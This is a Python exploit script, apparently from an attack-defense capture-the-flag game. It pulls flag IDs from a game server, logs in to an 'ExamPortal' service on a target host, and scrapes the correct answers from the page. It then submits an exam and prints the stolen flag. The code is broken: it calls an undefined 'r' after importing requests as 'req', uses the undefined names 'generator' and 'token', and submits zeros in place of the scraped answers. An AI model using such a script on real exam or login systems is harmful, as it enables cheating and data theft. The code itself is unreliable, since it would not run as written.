#!/usr/bin/env python3
import sys
sys.path.insert(1, '../imports/')
sys.path.insert(1, 'imports/')

import utils
import requests as req
import json
from bs4 import BeautifulSoup


def get_flag_ids():
    HOST = "http://10.10.0.1:8081/flagIds"
    res = r.get(HOST)
    return json.loads(res.text)




flag_ids = get_flag_ids()["ExamPortal"][sys.argv[1]]
#print(flag_ids)



target = f'http://{sys.argv[1]}:1237'

headers = {'User-Agent': generator.user_agent()}

for exam_id in flag_ids:

    s = r.session()

    res = s.post(target + '/login.php', data={'token':token}, headers=headers)
    #print(res.text)
    res = s.get(target + '/index.php', headers=headers).text

    soup = BeautifulSoup(res,features="html5lib")
    questions = soup.find_all("ul", class_="list-group mt-3")
    chars = []
    for q in questions:
        answers = q.findChildren("li")
        i=0
        for a in answers:
            if "success" in a["class"][2]:
                break
            i+=1
        char = ord('A')
        char +=i
        char = chr(char)
        chars+=char
        #print(chars)
    burp0_url = target + "/exam_submit.php"
    #print(type(exam_id))
    burp0_data = json.dumps({"id":int(exam_id), "answers":[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]})
    flag = s.post(burp0_url,burp0_data).text.replace("{\"msg\":\"", "").replace("\"}","").strip()
    flags = flag
    print(flags)

